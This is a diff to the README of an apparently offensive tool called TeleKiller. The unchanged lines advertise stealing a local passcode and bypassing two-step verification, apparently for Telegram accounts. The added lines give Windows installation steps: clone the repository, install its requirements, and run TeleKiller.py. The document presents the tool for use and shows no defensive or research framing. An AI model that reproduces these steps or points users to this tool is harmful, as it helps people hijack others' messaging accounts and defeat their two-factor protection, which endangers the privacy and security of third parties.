@@ -7,6 +7,15 @@
 - [x] Stealer Local Passcode
 - [x] Bypass 2 Step Verification
 
+## Installation [Windows ](https://wikipedia.org/wiki/Microsoft_Windows)[![alt tag](http://icons.iconarchive.com/icons/tatice/cristal-intense/32/Windows-icon.png)](https://fr.wikipedia.org/wiki/Microsoft_Windows)
+
+```
+git clone https://github.com/ultrasecurity/TeleKiller.git
+cd TeleKiller
+pip install -r requirements.txt
+python TeleKiller.py
+```
+
 ## Dependency :
 
 - [x] python 2.7
